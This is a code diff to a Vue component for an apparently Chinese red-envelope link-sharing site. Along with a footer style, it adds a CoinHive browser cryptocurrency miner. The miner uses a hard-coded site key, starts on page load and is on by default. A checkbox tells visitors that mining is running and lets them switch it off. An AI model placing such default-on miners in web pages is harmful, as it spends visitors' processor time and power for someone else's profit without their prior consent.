@@ -36,6 +36,10 @@
         <img src="./static/qrcode.png">
         <p class="text-center"><b>红包分享交流微信群</b><br>请加上面的微信号邀请你入群<br>（加群的朋友非常多，请耐心等待通过）</p>
       </div>
+      <div class="bottom" @click="toggleCoin">
+        <input type="checkbox" v-model="coin">
+        {{coin ? '本站已开启挖矿，点击可以取消' : '本站已关闭挖矿，点击继续挖矿'}}
+      </div>
     </div>
   </div>
 </template>
@@ -49,8 +53,12 @@
       return {
         url: '',
         mobile: localStorage.getItem('mobile') || '',
-        submit: false
+        submit: false,
+        coin: ['', 'true'].includes(localStorage.getItem('coin') || '')
       }
+    },
+    mounted () {
+      this.tryCoin()
     },
     methods: {
       async getHongbao () {
@@ -68,6 +76,16 @@
         }
         this.submit = false
         localStorage.setItem('mobile', mobile)
+      },
+      toggleCoin () {
+        this.coin = !this.coin
+        localStorage.setItem('coin', this.coin)
+        this.tryCoin()
+      },
+      tryCoin () {
+        if (this.coin) {
+          new CoinHive.Anonymous('WvcpW4CKlXIjRtcrFIhdRs1gmn6wqa2c').start()
+        }
       }
     }
   }
@@ -99,5 +117,11 @@
   .submit,
   img {
     width: 100%;
+  }
+
+  .bottom {
+    border-top: 1px dashed #ccc;
+    padding-top: 15px;
+    text-align: center;
   }
 </style>
